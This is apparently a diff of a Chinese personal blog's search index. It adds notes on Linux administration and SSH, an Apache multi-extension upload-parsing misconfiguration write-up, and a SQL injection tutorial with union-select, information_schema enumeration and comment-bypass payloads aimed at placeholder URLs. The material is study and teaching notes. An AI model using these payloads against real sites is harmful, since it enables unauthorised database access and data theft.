+删除帐号userdel命令，其格式如下：
+userdel 选项 用户名
+
+常用的选项是 -r，它的作用是把用户的主目录一起删除。
+用户组管理增加用户组groupadd命令：
+groupadd 选项 用户组
+
+选项：
+
+-g GID 指定新用户组的组标识号（GID）。
+-o 一般与-g选项同时使用，表示新用户组的GID可以与系统已有用户组的GID相同。
+
+删除用户组groupdel命令
+groupdel 用户组
+
+修改用户组groupmod命令
+groupmod 选项 用户组
+
+选项：
+
+-g GID 为用户组指定新的组标识号。
+-o 与-g选项同时使用，用户组的新GID可以与系统已有用户组的GID相同。
+-n新用户组 将用户组的名字改为新名字
+
+用户在用户组之间切换newgrp命令
+newgrp root
+
+（前提条件是root用户组确实是该用户的主组或附加组）这条命令将当前用户切换到root用户组，
+权限控制授予用户sudo权限用户到sudo用户组：
+
+在某些Linux发行版中，可以将用户添加到sudo用户组来赋予其sudo权限。
+
+使用以下命令将用户添加到sudo用户组：
+sudo usermod -aG sudo 用户名
+
+文件权限文件权限位包括读取（read）、写入（write）和执行（execute）权限。
+
+读取权限（r）允许用户查看文件内容和属性。
+写入权限（w）允许用户修改文件内容和属性。
+执行权限（x）允许用户以可执行文件的形式运行文件（例如，脚本或可执行程序）或进入目录。
+
+每个文件都有三组权限位，分别对应文件的所有者、用户组和其他用户。
+更改文件权限 chmod 命令可以更改文件的权限
+数字模式：可以使用三个八进制数字（0-7）来表示权限位。每个数字代表一个权限组，分别表示所有者、用户组和其他用户的权限。
+
+每个权限位用一个数字表示，对应的值为：
+r：4             w：2               x：1                   -：0
+
+
+将三个权限位的数字相加，得到一个三位数，例如：
+rwx：4 + 2 + 1 &#x3D; 7
+rw-：4 + 2 + 0 &#x3D; 6
+r–：4 + 0 + 0 &#x3D; 4
+—：0 + 0 + 0 &#x3D; 0
+
+
+
+符号模式：可以使用 +、- 和 = 符号来添加、移除或设置权限。符号前表示用户u（所有者）、g（用户组）、o（其他用户）、a（所有用户），后表示所操作的权限。
+
+给予读取权限：
+给予所有者读取权限：chmod u+r 文件名
+给予用户组读取权限：chmod g+r 文件名
+给予其他用户读取权限：chmod o+r 文件名
+给予所有用户（包括所有者、用户组和其他用户）读取权限：chmod a+r 文件名
+
+
+给予写入权限：
+给予所有者写入权限：chmod u+w 文件名
+给予用户组写入权限：chmod g+w 文件名
+给予其他用户写入权限：chmod o+w 文件名
+给予所有用户写入权限：chmod a+w 文件名
+
+
+给予执行权限：
+给予所有者执行权限：chmod u+x 文件名
+给予用户组执行权限：chmod g+x 文件名
+给予其他用户执行权限：chmod o+x 文件名
+给予所有用户执行权限：chmod a+x 文件名
+
+
+
+远程登录Linux 系统中是通过 ssh 服务实现的远程登录功能，默认 ssh 服务端口号为 22
+第一种级别（基于口令的安全验证）：只要你知道自己帐号和口令，就可以登录到远程主机。
+第二种级别（基于密钥的安全验证）：你必须为自己创建一对密钥，并把公钥放在需要访问的服务器上。
+密钥连接1.生成ssh key的文件windows 用户可以使用 WSL，或使用 Git Bash进行执行命令
+ssh-keygen 命令
+ssh-keygen 参数
+
+可选参数：
+
+-t：指定密钥类型。常见的选项包括 rsa、dsa、ecdsa 和 ed25519。默认为 rsa。
+-b：指定密钥位数。默认为 2048 位。常见的选项包括 1024、2048、4096。
+-C：添加注释。可以在生成的公钥文件中添加一段注释，用于标识该密钥的用途或所有者等信息。
+-f：指定生成的密钥文件名。可以自定义密钥文件的名称和路径。
+-N：设置密码短语（passphrase）。可以为私钥文件设置密码短语，以增加安全性。
+-q：静默模式。生成密钥时不显示进度或警告信息。
+-y：从私钥文件中提取公钥。可以使用私钥文件生成对应的公钥文件。
+
+XiaoWei@XiaoWEI MINGW64 ~/.ssh$ ssh-keygen -t rsa -b 4096 -f aliyun_rsaGenerating public/private rsa key pair.Enter passphrase (empty for no passphrase):  //如果不想在之后登录的时候还需要输入密码请直接回车Enter same passphrase again:   //如果不想在之后登录的时候还需要输入密码请直接回车Your identification has been saved in aliyun_rsaYour public key has been saved in aliyun_rsa.pub
+
+注意：
+密钥用于鉴权，请谨慎保管。公钥文件以 .pub 扩展名结尾，可以公开给其他人，而没有 .pub 扩展名的私钥文件不要泄露给任何人！
+2.部署公钥到服务器
+创建 SSH 目录和授权文件：在目标服务器上，如果尚未存在，请创建 .ssh 目录，并将其权限设置为 700：
+mkdir -p ~/.sshchmod 700 ~/.ssh
+
+添加公钥到授权文件：将公钥粘贴到服务器上的 ~/.ssh/authorized_keys 文件中。如果该文件不存在，请创建它，并将其权限设置为 600：
+vim ~/.ssh/authorized_keyschmod 600 ~/.ssh/authorized_keys
+
+保存并退出：保存对 authorized_keys 文件的更改，并退出服务器。
+
+
+3.更改配置文件有些Linux可能默认禁止ssl的密钥登录
+
+SSH 配置文件位于 /etc/ssh/sshd_config，可使用以下命令进行配置
+sudo vi /etc/ssh/sshd_config
+
+如果您只想更改用户级别的 SSH 配置，可以编辑 ~/.ssh/config 文件。
+
+在配置文件中，常见的 SSH 配置选项：
+
+Port：指定 SSH 服务器监听的端口号。
+PermitRootLogin：允许或禁止使用 root 用户进行 SSH 登录。
+PasswordAuthentication：允许或禁止使用密码进行身份验证。
+PubkeyAuthentication：允许或禁止使用公钥进行身份验证。
+AllowUsers 或 AllowGroups：限制允许登录的用户或组。
+DenyUsers 或 DenyGroups：禁止登录的用户或组。
+PrintMotd：显示登录时的欢迎信息。
+Banner：指定自定义的登录横幅文件。
+
+
+
+4.本机ssh的config设置（快捷登录）Host 名称(自己决定，方便输入记忆的)    HostName 主机名 #172.16.8.152    User root # SSH 连接的用户名    # Port 29172 端口 默认22    # PreferredAuthentications publickey,password  # 选项publickey/password/publickey,password  设置首选的身份验证方法，先尝试公钥验证，然后尝试密码验证    # IdentityFile ~/.ssh/work_id_rsa  # 使用的身份验证密钥文件路径    # ForwardAgent yes  # 启用 SSH 代理转发    # ForwardX11 yes  # 启用 X11 转发    # Compression yes  # 启用连接压缩    # StrictHostKeyChecking yes  # 设置主机密钥检查级别为严格检查    # LogLevel VERBOSE  # 设置 SSH 客户端的日志级别为详细模式    # ServerAliveInterval 60  # 设置 SSH 连接的保活机制，每60秒发送保活消息    # ServerAliveCountMax 3  # 设置 SSH 连接的保活机制，最多发送3个保活消息    # ProxyJump jumpbox  # 使用跳板机（代理主机）访问目标主机
+
+
+
+软件安装
+Ubuntu&#x2F;Debian:
+使用APT包管理器：
+安装软件：sudo apt-get install 软件名称
+卸载软件：sudo apt-get remove 软件名称
+更新软件包列表：sudo apt-get update
+升级已安装的软件包：sudo apt-get upgrade
+
+
+
+
+CentOS&#x2F;RHEL&#x2F;Fedora:
+使用YUM包管理器：
+安装软件：sudo yum install 软件名称
+卸载软件：sudo yum remove 软件名称
+更新软件包列表：sudo yum update
+升级已安装的软件包：sudo yum upgrade
+
+
+
+
+Alpine Linux:
+使用apk包管理器：
+
+安装软件：apk add 软件名称
+
+卸载软件：apk del 软件名称
+
+更新软件包列表：apk update
+
+升级已安装的软件包：apk upgrade
+
+
+
+
+
+
+常用命令前置知识1.目录符号 / 表示从 根目录
+~表示从 家目录(即&#x2F;home&#x2F;用户名，root用户为/root)
+. 代表当前目录
+.. 代表上一级目录
+2.绝对目录与相对目录相对路径 在输入路径时，使用.或者..，表示相对 当前目录 所在的目录位置 
+绝对路径 在输入路径时，最前面是 &#x2F; 或者 ~，表示从 根目录&#x2F;家目录 开始的具体目录位置，特点：需要写入完整地址
+3.&gt; 和 &gt;&gt;重定向 命令功能：将命令执行结果重定向到一个文件，将本应显示在终端上的内容 输出或追加 到指定文件中
+ &gt; 表示输出，会覆盖文件原有的内容 
+&gt;&gt; 表示追加，会将内容追加到已有文件的末尾
+4.|管道符
+Linux 允许将 一个命令的输出 可以通过管道| 做为 另一个命令的输入
+这里 | 的左右分为两端， 左端塞东西（写），右端取东西（读）
+
+pwd 命令对应单词：print working directory
+功能：打印当前工作目录
+ls 命令对应单词：list
+功能：列出目录的内容或者使用通配符列出文件名匹配的文件
+格式:
+ls [参数]
+
+可选参数
+
+
+
+-a
+显示指定目录下所有目录与文件，包括隐藏文件
+
+
+
+-l
+以列表方式显示文件的详细信息
+
+
+-h
+配合 -l 以人性化的方式显示文件大小
+
+
+注意：以 . 开头的文件为隐藏文件，需要用 -a 参数才能显示
+find 命令对应单词：find
+功能：指定目录及其子目录下查找文件和目录
+格式
+find [路径] [匹配条件] [动作]
+
+常用的匹配条件：
+
+
+
+可选匹配条件
+作用
+
+
+
+-name
+按文件名查找，支持使用通配符 * 和 ?
+
+
+-type
+按文件类型查找，可以是 f（普通文件）、d（目录）、l（符号链接）等。
+
+
+-size[+-]
+按文件大小查找，支持使用 + 或 - 表示大于或小于指定大小，单位可以是 c（字节）、w（字数）、b（块数）、k（KB）、M（MB）或 G（GB）。
+
+
+-mtime
+按修改时间查找，支持使用 + 或 - 表示在指定天数前或后，days 是一个整数表示天数。
+
+
+-user
+按文件所有者查找。
+
+
+-group
+按文件所属组查找。
+
+
+cd 命令对应单词：change directory
+功能：更改当前的工作目录
+格式:
+cd 目录
+
+cd搭配符号
+
+
+
+命令
+含义
+
+
+
+cd  &#x2F;cd ~
+切换到当前用户的主目录(&#x2F;home&#x2F;用户目录)
+
+
+cd .
+保持在当前目录不变
+
+
+cd ..
+切换到上级目录
+
+
+cd –
+可以在最近两次工作目录之间来回切换
+
+
+touch命令功能：
+
+如果文件不存在，可以创建一个空白文件 
+如果文件已经存在，可以修改文件的末次修改日期
+
+mkdir命令对应单词：make directory
+功能：创建一个新的目录
+
+
+
+选项
+含义
+
+
+
+-p
+创建多级目录需要创建一个目录的同时，也需要创建其上级目录（如果上级目录不存在）
+
+
+注意：新建目录的名称 不能与当前目录中 已有的目录同名
+rm命令对应单词：remove
+功能：删除文件或目录
+
+
+
+可选参数
+含义
+
+
+
+-f
+强制删除，忽略不存在的文件，无需提示
+
+
+-r
+递归地删除目录下的内容，删除文件夹时必须加此参数
+
+
+cp命令对应单词：copy
+功能：复制文件或者目录
+
+
+
+可选参数
+含义
+
+
+
+-i
+覆盖文件前提示
+
+
+-r
+若给出的源文件是目录文件，则 cp 将递归复制该目录下的所有子目录和文件，目标文件必须为一个目录名
+
+
+mv命令对应单词：move
+功能：移动文件或者目录／文件或者目录重命名
+
+
+
+可选参数
+含义
+
+
+
+-i
+覆盖文件前提示
+
+
+cat命令对应单词：  concatenate
+功能：查看文件内容、创建文件、文件合并、追加文件内容等功能.,适合查看内容较少的文本文件
+
+
+
+可选参数
+含义
+
+
+
+-b
+对非空输出行编号
+
+
+-n
+对输出的所有行编号
+
+
+more命令对应单词：  more
+功能：  分屏显示文件内容
+使用 more 的操作键：
+
+
+
+操作键
+功能
+
+
+
+空格键
+显示手册页的下一屏
+
+
+Enter
+键 一次滚动手册页的一行
+
+
+b
+回滚一屏
+
+
+f
+前滚一屏
+
+
+q
+退出
+
+
+&#x2F;word
+搜索 word 字符串
+
+
+echo命令对应单词：  more
+功能：  在终端中显示参数指定的文字，通常会和重定向联合使用
+进程命令ps命令：英文：  process status 
+作用：显示当前正在运行的进程的快照。
+
+
+
+命令
+作用
+
+
+
+ps aux
+查看进程的详细状况
+
+
+ps -ef
+显示所有进程的完整信息
+
+
+ps 进程代号
+显示特定进程代号的详细信息
+
+
+top
+
+
+
+kill [-9] 进程代号
+终止指定代号的进程， -9 表示强行终止
+
+
+ps 默认只会显示当前用户通过终端启动的应用程序 ps 选项说明
+
+
+
+选项
+含义
+
+
+
+a
+显示终端上的所有进程，包括其他用户的进程
+
+
+u
+显示进程的详细状态
+
+
+x
+显示没有控制终端的进程
+
+
+top命令：作用：  动态显示运行中的进程并且可以按 CPU 使用率、内存使用率等对进程进行排序
+输入 q退出 top 命令界面
+kill命令：作用：  向进程发送信号以终止或操作进程
+常见用法
+
+
+
+命令
+作用
+
+
+
+kill 进程代号
+向指定进程代号的进程发送默认的终止信号
+
+
+kill -9 进程代号
+向指定进程代号的进程发送强制终止信号
+
+
+提示：使用 kill 命令时，最好只终止由当前用户开启的进程，而不要终止 root 身份开启的进程，否则可能导致系统崩溃
+pgrep命令：作用：  向进程发送信号以终止或操作进程
+pgrep [选项] &lt;进程名称&gt;
+
+其中，&lt;进程名称&gt; 是要匹配的进程名称或模式。可以使用通配符进行模糊匹配。
+
+
+
+可选选项
+说明
+
+
+
+-u &lt;用户名&gt;
+根据用户名过滤进程。
+
+
+-n
+仅返回最新的匹配进程的进程 ID。
+
+
+-x
+精确匹配进程名称，不进行模糊匹配。
+
+
+-d &lt;分隔符&gt;
+指定输出的分隔符，默认为换行符。
+
+
+参考文章
+参考菜鸟教程的文章
+原文链接：Linux 用户和用户组管理 | 菜鸟教程 (runoob.com)、Linux find 命令 | 菜鸟教程 (runoob.com)
+
+参考腾讯云开发者社区博主全栈程序员站长的文章
+原文链接：史上最全的Linux常用命令汇总（超全面！超详细！）收藏这一篇就够了！-腾讯云开发者社区-腾讯云 (tencent.com)
+
+
+]]></content>
+      <categories>
+        <category>操作系统</category>
+      </categories>
+      <tags>
+        <tag>CTF-Web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>中间件漏洞</title>
+    <url>/posts/2304588875/</url>
+    <content><![CDATA[施工中
+Apache2.0-2.2版本存在个漏洞 CE-2012-0053:
+攻击者可通过向网站植人超大的Cookie,令其HTTP头超过Apache的LititRequestFieldSize (最大请求长度，4192字节)，使得Apache返回400错误，状态页中包含了HttpOnly 保护的Cookie。
+core - Apache HTTP Server 版本 2.4
+Apache解析配置漏洞\多后缀名解析配置漏洞解析配置漏洞简介此漏洞实际为人为的错误配置导致的漏洞，与Apache本身无关。
+Apache对于多后缀文件的处理规则是：Files with Multiple Extensions-mod_mime
+ 对应的翻译 
+              
+              元数据指扩展名映射到关于语言、内容类型、字符集或编码的信息   原文： metadata (language, content type, character set or encoding) 文件可以有多个扩展名；扩展名的顺序通常是无关紧要的。例如，如果文件 welcome.html.fr 映射到内容类型 text&#x2F;html 和法语，则文件 welcome.fr.html 会映射到完全相同的信息。如果给出了多个映射到相同类型元数据的扩展名，则右边的扩展名将被使用，语言和内容编码除外。例如，如果 .gif 映射到媒体类型 image&#x2F;gif，而 .html 映射到媒体类型 text&#x2F;html，则文件 welcome.gif.html 将与媒体类型 text&#x2F;html 关联。语言和内容编码被视为累积的，因为可以为特定资源分配不止一种语言或编码。例如，文件 welcome.html.en.de 将以 Content-Language: en, de 和 Content-Type: text&#x2F;html 交付。当一个具有多个扩展名的文件同时与媒体类型和处理程序关联时，应该小心处理。这通常会导致请求由与处理程序关联的模块处理。例如，如果 .imap 扩展名映射到处理程序 imap-file（来自 mod_imagemap），而 .html 扩展名映射到媒体类型 text&#x2F;html，则文件 world.imap.html 将同时与 imap-file 处理程序和 text&#x2F;html 媒体类型关联。处理时，将使用 imap-file 处理程序，因此它将被视为一个 mod_imagemap 图像映射文件。如果你希望只有文件名中最后一个点分隔的部分映射到特定的元数据，那么不要使用 Add* 指令。例如，如果你希望文件 foo.html.cgi 被处理为 CGI 脚本，但不希望文件 bar.cgi.html 如此处理，那么不要使用 AddHandler cgi-script .cgi，而是使用仅基于最终扩展名SetHandler配置处理程序&lt;FilesMatch &quot;[^.]+\.cgi$&quot;&gt;  SetHandler cgi-script&lt;/FilesMatch&gt;
+              
+            
+
+Apache对多后缀文件的识别概括来说为：
+
+Apache允许文件有多个扩展名，并且会将所有后缀名进行识别，识别的顺序为：从右到左
+如： .html.fr 映射到 Content-Type: text/html 和Content-Language: de。
+
+
+Apache允许扩展名映射到元数据(包括：语言、内容类型、字符集或编码)、处理程序。
+如 .html 映射到 Content-Type: text/html。
+
+
+对于相同类型元数据，以从右到左第一个出现的为准，但对于语言和内容编码可累积的元数据，将会叠加。
+如：.gif.html根据此规则映射到 Content-Type: text/html。
+​      .html.en.de根据此规则映射到Content-Language: en, de 和 Content-Type: text/html
+
+
+由于映射到处理程序和映射媒体类型，最后的返回结果不一致（一个为经过程序处理，一个为返回媒体文件）。当出现不同扩展名映射到处理程序和媒体类型时，映射到处理程序的优先等级高于映射到媒体类型
+如：.imap.html扩展名.imap 映射到处理程序 imap-file， .html 映射到Content-Type: text/html ，根据上述原则，.imap.html文件会被imap-file程序处理
+
+
+
+ 一点我的理解 
+              
+              按我的理解：元数据（metadata）是用于指示文件的类型或处理方式这里我把元数据（metadata）的定义包括了处理方式，根据一下段落合理的进行拓展定义If you would prefer only the last dot-separated part of the filename to be mapped to a particular piece of meta-data, then do not use the Add* directives. For example, if you wish to have the file foo.html.cgi processed as a CGI script, but not the file bar.cgi.html, then instead of using AddHandler cgi-script .cgi如果你希望只有文件名中最后一个点分隔的部分映射到特定的元数据，那么不要使用 Add* 指令。例如，如果你希望文件 foo.html.cgi 被处理为 CGI 脚本，但不希望文件 bar.cgi.html 如此处理，那么不要使用 AddHandler cgi-script .cgi因此当出现多个映射到处理程序，会按照从右到左第一个出现的为准，进行处理程序
+              
+            
+
+
+
+使用 Add* 指令，Apache处理一个文件时会应用上述规则
+Add* 指令指的是如：AddType、AddDefaultCharset、AddEncoding、AddHandler、AddOutputFilter、AddLanguage、AddCharset等指令，其中AddHandler设置对应后缀名映射到处理程序，如：
+AddHandler application/x-httpd-php .php
+
+
+
+由此，当用户上传一个a.php.jpg文件时，Apace的配置文件中包含AddHandler处理PHP文件，且未对上传后的文件进行重命名，此时a.php.jpg被解析为一个PHP脚本，解析漏洞由此而来
+
+
+
+
+解析配置漏洞条件
+文件没有被重命名
+Apache中配置中含有AddHandler的设置
+
+解析配置漏洞解决办法
+将上传的文件进行重命名
+根据官方文档的说明，可以使用SetHandler指令来代替AddHandler，因为SetHandler仅根据最右端的后缀名来判断映射的处理程序
+
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>CTF-Web</tag>
+        <tag>Web-Middleware</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>C Primer Plus笔记</title>
     <url>/posts/3276277813/</url>
     <content><![CDATA[C语言概述C程序的基本结构​       程序由一个或多个函数组成，必须有 main()函数。
@@ -1062,1124 +2432,178 @@ Bug日记1.for循环局部变量错误
       </tags>
   </entry>
   <entry>
-    <title>Kali优化</title>
-    <url>/posts/1455897523/</url>
-    <content><![CDATA[kali解压打开默认密码为：kali
-设置中文打开Terminal，输入命令：
-sudo dpkg-reconfigure locales
+    <title>SQL注入-基础</title>
+    <url>/posts/3000552397/</url>
+    <content><![CDATA[SQL注入流程
+找到注入点：判断是否有漏洞，寻找插入位置
+构造注入语句，并在注入点注入形成新的SQL语句
+新形成的SQL语句提交数据库处理
+数据库执行新的SQL语句，引发注入攻击
 
-进入后使用键盘的↑+↓←，到最底部，找到 [ ] zh_CN.UTF-8 UTF-8  ，按空格键选中，再按回车进入下一个页面，再选中 zh_CN.UTF-8作为默认语言，后回车
-等待下载结束后重启即可  
-换源因为官方源都是的速度慢，所以选择换国内源
-打开Terminal，输入命令
-sudo vim /etc/apt/sources.list
+前置知识1.特别的数据库
+在MySQL 5.0版本之后，MySQL默认在数据库中存放一个information_schema的数据库，在该库中，需要记住三个表名，分别是：schemata、tables、columns。
 
-可选的国内源
-#阿里云源deb http://mirrors.aliyun.com/kali kali-rolling main non-free contribdeb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib#中科大源deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contribdeb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib#清华大学源deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main non-free contribdeb-src http://mirrors.tuna.tsinghua.edu.cn//kali kali-rolling main non-free contrib#浙大源deb http://mirrors.zju.edu.cn/kali kali-rolling main non-free contribdeb-src http://mirrors.zju.edu.cn/kali kali-rolling main non-free contrib
+schemata表存储该用户创建的所有数据库的库名。
+   &gt;&gt;&gt;&gt;其中记录数据库库名的字段名为：schema_name。
 
-不懂vim语法的按以下步骤来
+tables表存储该用户创建的所有数据库的库名和表名。
+  &gt;&gt;&gt;&gt;其中记录数据库库名和表名的字段名分别是：tables_schema和table_name。
 
-全选删除原本的内容
-​	按esc键后，先按 g  g（到达顶部），然后再按 d  G(区分大小写！！！)
-
-复制以上内容，右键粘贴
-
-保存退出
-​	按esc键后，同时按住shift键和英文**:**键，再输入wq
+columns表存储该用户创建的所有数据库的库名、表名和字段名。
+  &gt;&gt;&gt;&gt;其中记录数据库库名、表名和字段名的字段名分别是：tables_schema、table_name和column_name。
 
 
-系统优化1.设置root账户密码sudo passwd root
+2.注释符
+  在MySQL中，常见注释符的表达方式：
+​	   # …… ：#号后面的都会被注释
+​	   -- …… ：--号后面的都会被注释，不过在 -- 的前后都需要加空格再加数据(GET传参时只能使用--，后的空格用+代替)
+​	   /* ... */ ：在查询语句中使用斜杠星号注释，从 &#x2F; 开始到 *&#x2F; 结束的部分都被视为注释，不会被执行。
 
-2.设置禁止休眠
-打开左上角kali图标
-点击settings(设置)
-点击进入power Manger(电源管理器)
-在Power Manager 选择—&gt; display(显示)  把使用电池和插入电源下的依次把Blank after、Put to sleep after和Switch off after 全部设置成为 Never
 
-3.软件数据库更新：apt-get update
+但**/* ... */** 的特殊用法--条件注释
 
-4.软件更新：apt-get upgrade
+条件注释是一种特殊的注释语法，它允许在注释中使用关键字，而这些关键字在执行查询时会被解析为相应的操作。
+语法格式为：
+/*!&lt;conditional_keyword&gt; &lt;query_part&gt; */
 
-5.系统更新：apt-get dist-upgrade
+   例如：index?id=-10 /*!union*/ /*!select*/ 1,2,3等同于index?id=-10 union select 1,2,3
+SQL注入常用基础语句select version(); #查看数据库版本 select user(); #查看数据库用户select database(); #查看当前库名;select table_name from information_schema.tables where table_schema=database() ; #查看当前库下的表名select group_concat(table_name) from information_schema.tables where table_schema=database() ; #只回显一行数据下查看当前库下的全部表名select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;xxx&#x27;; #查询列名-把xxx缓存前面查询到的表名
 
 
 
-安装中文输入法
-更新包管理器的软件包列表：
-sudo apt-get update
+SQL注入常用函数联合查询(union)注入使用1.concat()函数
+​	concat()函数：将多个不同字段的字符串连接成一个字符串。
+concat(str1，str2) #语法
 
-安装fcitx输入法框架：
-sudo apt-get install fcitx
+注意：返回结果为连接参数产生的字符串，如果有任何一个参数为null，则返回值为null。
+2.group_concat()函数
+​	group_concat() 将多个同个字段的字符串连接成一个字符串。
+group_concat( [distinct] 要连接的字段 [order by 排序字段 asc/desc] [separator ‘分隔符’]) #语法
 
-安装fcitx-googlepinyin谷歌拼音输入法：
-sudo apt-get install fcitx-googlepinyin
+报错注入使用1.extractvalue()函数
+​	从 MySQL 5.7.8 版本开始，ExtractValue() 函数已被弃用
+​	ExtractValue() 函数来提取 XML 字符串中的特定路径的值。
+ExtractValue(xml_string, xpath_expression)
 
-ctrl+space(空格)切换输入法
-界面美化1.整体字体放大
-打开左上角kali图标
-点击设置进入外观
-选择字体，修改DPI
 
-1.桌面图标大小
-桌面右键选择桌面设置
-选择图标，调节图标大小完成对桌面图标的调节。（这步也可以设置图标下的字体 自定义大小）
+xml_frag：xml文档对象的名称，是一个string类型。
+xpath_expr：使用xpath语法格式的路径。
 
-2.菜单栏大小以及位置
-在菜单栏空白处右键—选择面板再点击面板首选项
-打开面板后选择显示—尺寸—调节行大小
-关闭锁定面板，可拖动作用两侧的小点将面板放置于最下侧
+2.updataxml()函数
 
-3.终端字体
-打开终端再点击左上角文件点击参数设置
-打开设置界面，界面设置—调节字体大小
+xml_target：xml文档对象的名称，是一个string类型。
+xpath_expr：使用xpath语法格式的路径。
+new_xml：需要更新的内容。
 
-4.系统字体
-打开左上角kali图标
-点击设置进入外观
-选择字体，修改默认字体和默认等宽字体
+3.count()+rand()+floor()+group by()函数
+rand()函数：rand()返回0到1的随机数。rand(0)返回一个固定的0到1的伪随机数。
+floor()函数：floor(x)返回小于或等于 x 的最大整数。
+group by语句：group by语句可以根据一个或多个列对结果集进行分组，在分组的列上我们可以使用 COUNT, SUM, AVG,等函数。
+布尔盲注使用1.substr()/substring()函数
+​	substr()/substring()函数：用来截取数据库某个字段中的一部分。
+substr(string，start开始位置，length截取长度)  #语法
 
-4.窗口字体
-打开左上角kali图标
-点击设置进入窗口管理器
-选择样式修改标题字体
+参数
 
-]]></content>
+string：必选，数据库中需要截取的字段
+start：必选。正数，从字符串指定位置开始截取；负数，从字符串结尾指定位置开始   截取；0，在字符串中第一个位置开始截取。
+length：可选，需要截取的长度。缺省。即截取到结束位置
+
+2.ascii()函数
+​	ascii()函数：返回字符串str的最左边的数值。
+ascii(str)  #语法
+
+2.length() 函数，返回字符串的长度
+length(str) #语法
+
+
+
+
+
+
+
+注入点分类①数字型注入点类似的后端语句
+$id=$_GET[&#x27;id&#x27;];$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result);
+
+ 在 Web 端大概是 http://xxx.com/index.php?id=1 这种形式，其注入点 id 类型为数字，所以叫数字型注入点。
+用1 and 1=1进行组合出来的sql注入语句为：
+select * from news where id=1 and 1=1
+
+
+
+②字符型注入点类似的后端语句
+$id=$_GET[&#x27;id&#x27;];$sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result);
+
+ 在 Web 端大概是 http://xxx.com/index.php?id=admin 这种形式，其注入点id 类型为字符类型，所以叫字符型注入点。
+使用id=1&#39; and 1=1 --+组合出来的sql注入语句为：
+select * from news where id=&#x27;admin&#x27; and 1=1 --+&#x27; LIMIT 0,1&quot;;
+
+ 注意多了一个引号。由于注入拼接语句后多了一个&#39;,需要用注释符进行消除对语句的影响
+③搜索型注入点这是一类特殊的注入类型。这类注入主要是指在进行数据搜索时没过滤搜索参数，一般在链接地址中有“keyword&#x3D;关键字”，有的不显示在的链接地址里面，而是直接通过搜索框表单提交。此类注入点提交的 SQL 语句，其原形大致为：
+select * from 表名 where 字段 like &#x27;%关键字%&#x27;`。组合出来的sql注入语句为：select * from news where search like &#x27;%测试 %&#x27; and &#x27;%1%&#x27;=&#x27;%1%&#x27;测试%&#x27; union select 1,2,3,4 and &#x27;%&#x27;=&#x27;
+
+
+
+
+
+判断注入点注意区别语句报错与页面报错、页面数据不正确的区别
+​	1.?id=1 and 1=1 和?id=1 and 1=2进行测试如果1&#x3D;1页面显示正常和原页面一样，并且1&#x3D;2页面报错或者页面部分数据显示不正常，那么可以确定此处为数字型注入。
+​	2.?id=1&#39; and 1=1 --+ / #和?id=1&#39; and 1=2 --+ / #或使用?id&#39; and &#39;1&#39;=&#39;1和?id&#39; and &#39;1&#39;=&#39;2进行测试如果1&#x3D;1页面显示正常和原页面一样，并且1&#x3D;2页面报错或者页面部分数据显示不正常，那么可以确定此处为字符型注入。
+​	3.?id=1%&#39; and 1=1 --+ / #和?id=1%&#39; and 1=2 --+ / #进行测试如果1&#x3D;1页面显示正常和原页面一样，并且1&#x3D;2页面报错或者页面部分数据显示不正常，那么可以确定此处为搜索型注入。
+注入方法]]></content>
       <categories>
-        <category>解决方案</category>
-      </categories>
-      <tags>
-        <tag>Tools</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>HTML笔记</title>
-    <url>/posts/2607722179/</url>
-    <content><![CDATA[HTML简介HTML（HyperText Markup Language）是用来描述网页的一种语言。
-HTML标签
-HTML 标签是由尖括号包围的关键词，比如 &lt;html&gt;
-HTML 标签通常是成对出现的，比如 &lt;b&gt; 和 &lt;/b&gt;
-标签对中的第一个标签是开始标签，第二个标签是结束标签
-
-注：”HTML 标签” 和 “HTML 元素” 通常都是描述同样的意思。
-HTML声明&lt;!DOCTYPE&gt;声明有助于浏览器中正确显示网页。doctype 声明是不区分大小写的
-HTML实例
-&lt;!DOCTYPE html&gt;   &lt;!-- 声明为HTML5文档 --&gt;&lt;!-- HTML页面开始 --&gt;&lt;html&gt;	&lt;!-- 头部元素开始 --&gt;	&lt;head&gt;	&lt;meta charset=&quot;utf-8&quot;&gt;	&lt;title&gt;HTML&lt;/title&gt;	&lt;/head&gt;	&lt;!-- 头部元素结束 --&gt;        &lt;!-- 可见的页面内容开始 --&gt;	&lt;body&gt;	&lt;h1&gt;我的第一个标题&lt;/h1&gt;	&lt;p&gt;我的第一个段落。&lt;/p&gt; 	&lt;/body&gt;     &lt;!-- 可见的页面内容结束 --&gt;&lt;/html&gt;&lt;!-- HTML页面结束 --&gt;
-
-
-
-HTML基础构成标题HTML 标题（Heading）是通过&lt;h1&gt; - &lt;h6&gt; 标签来定义的。
-&lt;h1&gt;这是标题 1&lt;/h1&gt;&lt;h2&gt;这是标题 2&lt;/h2&gt;&lt;h3&gt;这是标题 3&lt;/h3&gt;&lt;h4&gt;这是标题 4&lt;/h4&gt;&lt;h5&gt;这是标题 5&lt;/h5&gt;&lt;h6&gt;这是标题 6&lt;/h6&gt;
-
-
-
-段落HTML 段落是通过标签 &lt;p&gt; 来定义的。
-&lt;p&gt;这是一个段落。&lt;/p&gt;&lt;p&gt;这是一个段落。&lt;/p&gt;&lt;p&gt;这是一个段落。&lt;/p&gt;
-
-
-
-水平线&lt;hr&gt; 标签在 HTML 页面中创建水平线,可用于分隔内容。
-&lt;p&gt;这是一个段落。&lt;/p&gt;&lt;hr&gt;&lt;p&gt;这是一个段落。&lt;/p&gt;&lt;hr&gt;&lt;p&gt;这是一个段落。&lt;/p&gt;
-
-
-
-
-注释语法
-&lt;!-- 这是一个注释 --&gt;
-
-
-
-折行&#x2F;换行在不产生一个新段落的情况下进行换行（新行），请使用 &lt;br&gt; 标签
-&lt;p&gt;这个&lt;br&gt;段落&lt;br&gt;演示了分行的效果&lt;/p&gt;
-
-注意：&lt;br&gt; 元素是一个空的 HTML 元素。由于关闭标签没有任何意义，因此它没有结束标签。
